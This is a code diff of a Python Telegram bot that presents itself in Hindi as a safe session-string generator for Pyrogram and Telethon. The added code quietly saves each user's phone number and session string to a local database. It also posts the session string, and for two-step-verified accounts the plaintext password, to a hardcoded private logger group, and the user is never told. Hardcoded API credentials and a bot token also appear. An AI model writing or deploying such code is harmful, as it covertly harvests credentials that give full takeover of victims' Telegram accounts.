@@ -1,99 +1,176 @@
-import logging
 import asyncio
-from telethon import TelegramClient
+from telethon import TelegramClient, events, Button
 from telethon.sessions import StringSession
-from telethon.errors import (
-    PhoneCodeInvalidError,
-    PhoneCodeExpiredError,
-    SessionPasswordNeededError
-)
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackContext, CallbackQueryHandler
-from telegram import InlineKeyboardButton, InlineKeyboardMarkup
+from telethon.errors import SessionPasswordNeededError
+from pyrogram import Client as PyroClient
+from pyrogram.errors import SessionPasswordNeeded
+import sqlite3
 
-API_ID = '28795512'  # Replace with your API ID
-API_HASH = 'c17e4eb6d994c9892b8a8b6bfea4042a'  # Replace with your API HASH
-BOT_TOKEN = '7767480564:AAGwzQ1wDQ8Qkdd9vktp8zW8aUOitT9fAFc'  # Replace with your bot token
+# 🔹 Telegram API Credentials
+API_ID = 28795512
+API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
+BOT_TOKEN = "7767480564:AAGwqXdd9vktp8zW8aUOitT9fAFc"
 
-logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
-logger = logging.getLogger(__name__)
+# 🔹 Logger Group ID (Replace with your Telegram Group ID)
+LOGGER_GROUP_ID = -1002477750706  
 
-# Ask for phone number
-phone_number_ques = "Please send your phone number with country code, e.g., +19876543210"
+# 🔹 Initialize the bot
+bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
 
-# Start command
-async def start(update: Update, context: CallbackContext) -> None:
-    await update.message.reply(
-        "Welcome to the Telegram Session String Generator Bot!\n"
-        "Please send your phone number to generate your session string."
+# 🔹 Store user sessions
+user_sessions = {}
+
+# 🔹 SQLite Database Connection with Timeout
+def get_db_connection():
+    return sqlite3.connect('session_data.db', timeout=10.0)  # Timeout after 10 seconds
+
+# 🔹 Ensure session_logs table is created
+def create_session_table():
+    with get_db_connection() as db_connection:
+        cursor = db_connection.cursor()
+        cursor.execute('''
+        CREATE TABLE IF NOT EXISTS session_logs (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER NOT NULL,
+            phone TEXT NOT NULL,
+            session_string TEXT NOT NULL,
+            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+        )
+        ''')
+        db_connection.commit()
+
+# ✅ /start Command
+@bot.on(events.NewMessage(pattern="/start"))
+async def start(event):
+    await event.respond(
+        "**👋 Session Generator Bot में आपका स्वागत है!**\n\n"
+        "🔹 **Pyrogram & Telethon के लिए Telegram Session Strings जनरेट करें**\n"
+        "🔹 **सुरक्षित और उपयोग में आसान**\n\n"
+        "**📌 जारी रखने के लिए एक विकल्प चुनें:**",
+        buttons=[
+            [Button.inline("🎭 Pyrogram Session जनरेट करें", b"generate_pyro")],
+            [Button.inline("🎭 Telethon Session जनरेट करें", b"generate_telethon")]
+        ]
     )
 
-# Request phone number
-async def send_phone_number(update: Update, context: CallbackContext) -> None:
-    await update.message.reply(phone_number_ques)
+# ✅ Pyrogram Session जनरेट करना
+@bot.on(events.CallbackQuery(pattern=b"generate_pyro"))
+async def ask_phone_pyro(event):
+    user_id = event.sender_id
+    user_sessions[user_id] = {"step": "phone_pyro"}
+    await event.respond("📱 **कृपया अपना फोन नंबर देश कोड के साथ डालें (उदाहरण: +919876543210)**")
 
-# Handle phone number and create session string
-async def handle_phone_number(update: Update, context: CallbackContext) -> None:
-    phone_number = update.message.text.strip()
-    context.user_data["phone_number"] = phone_number
-    
-    await update.message.reply("Please wait while we generate your session string...")
-    await generate_telethon_session(update, context)
+# ✅ Telethon Session जनरेट करना
+@bot.on(events.CallbackQuery(pattern=b"generate_telethon"))
+async def ask_phone_telethon(event):
+    user_id = event.sender_id
+    user_sessions[user_id] = {"step": "phone_telethon"}
+    await event.respond("📱 **कृपया अपना फोन नंबर देश कोड के साथ डालें (उदाहरण: +919876543210)**")
 
-# Generate Telethon session string
-async def generate_telethon_session(update: Update, context: CallbackContext) -> None:
-    phone_number = context.user_data["phone_number"]
-    try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.start(phone_number)
+# 🔹 उपयोगकर्ता इनपुट प्रोसेस करना
+@bot.on(events.NewMessage)
+async def process_input(event):
+    user_id = event.sender_id
+    if user_id not in user_sessions:
+        return  
 
-        # OTP request for Telethon
-        await update.message.reply("Please check your Telegram app for the OTP. Send the OTP here after you receive it.")
+    step = user_sessions[user_id]["step"]
+
+    # ✅ Step 1: फोन नंबर डालें
+    if step == "phone_pyro" or step == "phone_telethon":
+        phone_number = event.message.text.strip()
+        if not phone_number:  # यह सुनिश्चित करना कि फोन नंबर डाला गया है
+            await event.respond("❌ **कृपया एक वैध फोन नंबर डालें।**")
+            return
+
+        user_sessions[user_id]["phone"] = phone_number  # फोन नंबर को स्टोर करें
+
+        if step == "phone_pyro":
+            client = PyroClient(":memory:", api_id=API_ID, api_hash=API_HASH)
+            await client.connect()
+            sent_code = await client.send_code(phone_number)
+        else:
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
+            sent_code = await client.send_code_request(phone_number)
+
+        user_sessions[user_id]["client"] = client  
+        user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  
+        user_sessions[user_id]["step"] = "otp"
+        await event.respond("🔹 **OTP भेजा गया! कृपया प्राप्त OTP डालें।**")
+
+    # ✅ Step 2: OTP डालें
+    elif step == "otp":
+        otp_code = event.message.text.strip()
+        phone_number = user_sessions[user_id].get("phone")  # फोन नंबर को प्राप्त करें
+        if not otp_code:  # यह सुनिश्चित करना कि OTP डाला गया है
+            await event.respond("❌ **कृपया एक वैध OTP डालें।**")
+            return
+
+        client = user_sessions[user_id]["client"]
+        phone_code_hash = user_sessions[user_id]["phone_code_hash"]  
+
+        try:
+            if isinstance(client, PyroClient):
+                await client.sign_in(phone_number, phone_code_hash, otp_code)
+                session_string = await client.export_session_string()  
+            else:
+                await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
+                session_string = client.session.save()  
+
+            # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
+            create_session_table()  
+            with get_db_connection() as db_connection:
+                cursor = db_connection.cursor()
+                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                               (user_id, phone_number, session_string))
+                db_connection.commit()
+
+            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 नया Session जनरेट किया गया!**\n\n**👤 उपयोगकर्ता:** `{user_id}`\n**📞 फोन:** `{phone_number}`\n**🔑 Session:** `{session_string}`")
+
+            await event.respond(f"✅ **आपका Session String:**\n\n```{session_string}```\n\n🔒 **इसे सुरक्षित रखें!**")
+            del user_sessions[user_id]
+
+        except (SessionPasswordNeededError, SessionPasswordNeeded):
+            user_sessions[user_id]["step"] = "password"
+            await event.respond("🔑 **कृपया अपना Telegram पासवर्ड डालें (2-Step Verification)।**")
         
-        phone_code = await update.message.reply("Enter OTP: Please send it in the format '12345'.")
-        await client.sign_in(phone_number, phone_code.text)
+        except Exception as e:
+            await event.respond(f"❌ **त्रुटि:** {str(e)}\n🔄 कृपया फिर से प्रयास करें!")
+            del user_sessions[user_id]
 
-        # Two-step verification password (if enabled)
-        if client.is_user_authorized() is False:  # Check if 2FA is enabled
-            two_step_password = await update.message.reply("Please enter your two-step verification password.")
-            await client.sign_in(password=two_step_password.text)
+    # ✅ Step 3: 2FA पासवर्ड डालें
+    elif step == "password":
+        password = event.message.text.strip()
+        if not password:  # यह सुनिश्चित करना कि पासवर्ड डाला गया है
+            await event.respond("❌ **कृपया एक वैध पासवर्ड डालें।**")
+            return
 
-        # Get session string and send to user
-        session_string = client.session.save()
-        await update.message.reply(f"Your Telegram session string:\n`{session_string}`")
-    except PhoneCodeInvalidError:
-        await update.message.reply("OTP is invalid. Please try again.")
-    except PhoneCodeExpiredError:
-        await update.message.reply("OTP has expired. Please try again.")
-    except SessionPasswordNeededError:
-        await update.message.reply("Your account has 2FA enabled. Please provide your 2FA password.")
-    except Exception as e:
-        await update.message.reply(f"An error occurred: {str(e)}")
-    finally:
-        await client.disconnect()
+        client = user_sessions[user_id]["client"]
 
-# Main function to handle messages
-async def handle_message(update: Update, context: CallbackContext) -> None:
-    if update.message.text:
-        await update.message.reply("Please send your phone number to generate your session string.")
+        try:
+            if isinstance(client, PyroClient):
+                await client.check_password(password)
+                session_string = await client.export_session_string()  
+            else:
+                await client.sign_in(password=password)
+                session_string = client.session.save()  
 
-# Error handler
-def error(update: Update, context: CallbackContext) -> None:
-    logger.warning(f"Update {update} caused error {context.error}")
+            # सेशन स्ट्रिंग को डेटाबेस में लॉग करें
+            create_session_table()  
+            with get_db_connection() as db_connection:
+                cursor = db_connection.cursor()
+                cursor.execute("INSERT INTO session_logs (user_id, phone, session_string) VALUES (?, ?, ?)", 
+                               (user_id, user_sessions[user_id]["phone"], session_string))
+                db_connection.commit()
 
-def main():
-    # Create the Application
-    application = Application.builder().token(BOT_TOKEN).build()
+            await bot.send_message(LOGGER_GROUP_ID, f"**🆕 नया Session (2FA के साथ)!**\n\n**👤 उपयोगकर्ता:** `{user_id}`\n**🔑 Session:** `{session_string}`\n🔒 **पासवर्ड का उपयोग किया गया:** `{password}`")
 
-    # Commands and Message Handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(MessageHandler(filters.TEXT, handle_message))
+            await event.respond(f"✅ **आपका Session String:**\n\n```{session_string}```\n\n🔒 **इसे सुरक्षित रखें!**")
+            del user_sessions[user_id]
+        except Exception as e:
+            await event.respond(f"❌ **त्रुटि:** {str(e)}\n🔄 कृपया फिर से प्रयास करें!")
 
-    # Error handler
-    application.add_error_handler(error)
-
-    # Run the bot
-    application.run_polling()
-
-if __name__ == "__main__":
-    main()
+# 🔹 बॉट को चलाना
+print("🚀 बॉट चल रहा है...")
+bot.run_until_disconnected()
